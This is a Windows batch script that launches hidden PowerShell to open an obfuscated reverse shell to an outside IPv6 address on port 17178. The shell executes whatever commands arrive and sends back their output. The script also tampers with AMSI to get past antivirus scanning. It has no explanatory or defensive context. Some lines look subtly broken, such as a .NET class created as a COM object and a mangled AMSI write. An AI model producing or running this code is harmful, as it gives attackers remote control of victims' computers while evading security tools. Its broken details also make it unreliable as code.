@echo off
powershell -WindowStyle Hidden -Command "
function Invoke-ObfuscatedShell {
    $c = 'System.Net.Sockets.TCPClient'
    $a = '[2001:4860:7:171b::fd]'
    $p = 17178
    $s = 'GetStream'
    $r = 'Read'
    $e = 'System.Text.ASCIIEncoding'
    $x = 'iex'
    $y = 'Out-String'
    $z = 'pwd'
    $k = 'Path'
    $m = 'Write'
    $n = 'Flush'
    $o = 'Close'
    
    $client = (New-Object -ComObject $c)($a, $p)
    $stream = $client.$s()
    [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
    
    while (($i = $stream.$r($bytes, 0, $bytes.Length)) -ne 0) {
        $data = (New-Object -TypeName $e).GetString($bytes, 0, $i)
        $sendback = (& $x $data 2>&1 | & $y)
        $sendback2 = $sendback + 'PS ' + (& $z).$k + '> '
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.$m($sendbyte, 0, $sendbyte.Length)
        $stream.$n()
    }
    $client.$o()
}

[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null), 0x4D5A9000)
Invoke-ObfuscatedShell"
